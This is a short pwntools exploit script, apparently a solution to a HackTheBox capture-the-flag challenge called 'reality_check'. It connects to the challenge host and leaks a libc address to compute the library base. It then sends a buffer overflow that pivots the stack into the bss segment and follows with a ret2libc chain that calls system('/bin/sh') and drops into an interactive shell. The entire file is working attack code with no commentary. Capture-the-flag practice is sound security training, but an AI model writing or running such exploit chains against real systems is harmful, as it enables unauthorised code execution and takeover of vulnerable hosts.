from pwn import *
import time

#io = process("./reality_check")
io = remote("docker.hackthebox.eu",30606)
bss = 0x0804c000
if __name__ == "__main__":

    io.sendlineafter("> ","2")
    io.recvuntil("more.. ")
    leak = io.recvline().strip()[1:-1]

    log.info("libc @ "+leak.decode())
    base = int(leak,16) -0x50c60

    print(hex(base))
    io.sendlineafter("> ","1")

    sys = base+0x3ce10
    binsh = base+0x17b88f
    log.info("sys @ "+hex(sys))
    log.info("/bin/sh @ "+hex(binsh))



    payload = b"A"*58 + p32(bss+0x800) +p32(0x8049249)
    print(len(payload))
    #gdb.attach(io)
    io.sendafter("> ",payload)


    payload = p32(sys)+b"XXXX"+p32(binsh)
    p2 = b"xxxx"+payload + b"A"*(58-16) +b"B"*4+p32(0x804c1c6+0x600-4)+p32(0x804925b)
    time.sleep(2)
    io.send(p2)
    io.interactive()
